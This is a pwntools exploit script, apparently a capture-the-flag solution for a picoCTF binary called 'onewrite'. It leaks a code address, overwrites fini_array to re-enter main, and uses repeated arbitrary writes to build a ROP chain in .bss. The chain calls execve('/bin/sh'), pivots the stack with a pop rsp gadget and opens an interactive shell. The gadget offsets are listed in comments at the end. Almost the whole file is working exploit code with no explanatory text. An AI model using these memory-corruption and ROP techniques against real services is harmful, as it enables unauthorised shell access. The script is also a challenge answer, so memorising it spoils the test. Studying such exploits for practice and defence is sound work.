#!/usr/bin/python3
from pwn import *

exe = context.binary = ELF("./onewrite", checksec=False)
#libc = exe.libc
#libc = ELF("/tmp/libc6_2.35-0ubuntu3.10_i386.so", checksec=False)

warn = lambda x, msg="Test": log.warn(msg + ": " + hex(x)) or x
s = lambda data: sleep(0.1) or p.send(data)
sl = lambda data=b"": sleep(0.1) or p.sendline(data)
sa = lambda msg, data: p.sendafter(msg, data)
sla = lambda msg, data: p.sendlineafter(msg, data)

def conn():
    if args.REMOTE: 
        return remote("saturn.picoctf.net", 65497)
    else: 
        return process()
p = conn()

if args.GDB:
    context.terminal = ['tmux', 'splitw', '-h', '-p', '55']
    gdb.attach(p, gdbscript='''
        b do_leak
        c
        c 13
        del
        b*do_overwrite + 76
        c
	''')
#input()

sla(b" > ", b'2')
pie = warn(int(p.recvline(), 16), "pie")
exe.address = warn(pie - exe.sym['do_leak'], "exe base")
fini_array = warn(exe.address + 0x2adfb0, "fini_array")
sa(b"address : ", str(fini_array).encode())
sa(b"data : ", p64(exe.sym['main']))


bss = warn(exe.bss(400), "bss")

def write(addr, data):
    
    sla(b" > ", b'1')
    stack = warn(int(p.recvline(), 16), "stack")
    sa(b"address : ", str(stack-8).encode())
    sa(b"data : ", p64(exe.sym['do_overwrite']))
    
    sa(b"address : ", str(stack).encode())
    sa(b"data : ", p64(exe.sym['do_overwrite']))
    
    sa(b"address : ", str(addr).encode())
    sa(b"data : ", data)

    return stack
    
mov__rdi_rsi = p64(exe.address + 0x00000000000437db)
pop_rdi = p64(exe.address + 0x00000000000084fa)
pop_rsi = p64(exe.address + 0x000000000000d9f2)
pop_rdx = p64(exe.address + 0x00000000000484c5)
pop_rax = p64(exe.address + 0x00000000000460ac)
syscall = p64(exe.address + 0x000000000000917c)
ret = p64(exe.address + 0x0000000000008076)
warn(u64(mov__rdi_rsi), "mov")

rop = b""
rop += pop_rdi + p64(bss-0x10) 
rop += pop_rsi + b"/bin/sh\0"
rop += mov__rdi_rsi

rop += pop_rsi + p64(0)
rop += pop_rdx + p64(0)
rop += pop_rax + p64(0x3b)
rop += syscall

stack = 0
for i in range(len(rop)//8):
    stack = write(bss + i*8, rop[i*8:i*8+8])


pop_rsp = p64(exe.address + 0x000000000000946a)

write(stack-16, p64(bss))
warn(stack-16)

sla(b" > ", b'1')
stack = warn(int(p.recvline(), 16), "stack")
sa(b"address : ", str(stack-8).encode())
sa(b"data : ", pop_rsp)

p.interactive()

#0x0000000000031a9b : mov qword ptr [rdi], rcx ; ret
#0x0000000000031da3 : mov qword ptr [rdi], rdx ; ret
#0x00000000000437db : mov qword ptr [rdi], rsi ; ret
#
#0x00000000000084fa : pop rdi ; ret
#0x000000000000d9f2 : pop rsi ; ret
#0x00000000000484c5 : pop rdx ; ret
#0x00000000000460ac : pop rax ; ret
#0x000000000000917c : syscall
#
#0x000000000000946a : pop rsp ; ret
#0x0000000000008076 : ret
